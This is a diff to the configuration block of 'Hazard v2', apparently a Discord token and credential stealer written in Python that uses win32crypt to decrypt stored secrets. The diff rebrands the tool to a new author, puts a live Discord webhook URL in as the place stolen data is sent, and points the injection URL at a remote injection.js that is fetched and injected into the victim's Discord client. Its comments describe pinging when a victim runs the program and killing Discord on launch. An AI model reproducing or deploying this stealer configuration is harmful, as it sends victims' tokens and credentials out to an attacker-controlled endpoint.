@@ -22,17 +22,17 @@ from tempfile import mkdtemp, gettempdir
 from win32crypt import CryptUnprotectData
 from datetime import datetime, timezone, timedelta
 
-__author__ = "Rdimo"
+__author__ = "trhacknon"
 __version__ = '1.8.7'
 __license__ = "GPL-3.0"
 __config__ = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/trhacknon/Discord-Webhook-Protector
+    # Recommend using https://github.com/trhacknon/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+    'webhook': "https://discord.com/api/webhooks/992259876443148411/_x3RVBe40zmzjArAlMZYtb5YU6IqzuE4ZDhJ5oPLyTL8Om2HGYojaymCjy1Dr9X0egLs",
+    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/trhacknon/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    'injection_url': "https://raw.githubusercontent.com/trhacknon/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
     'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
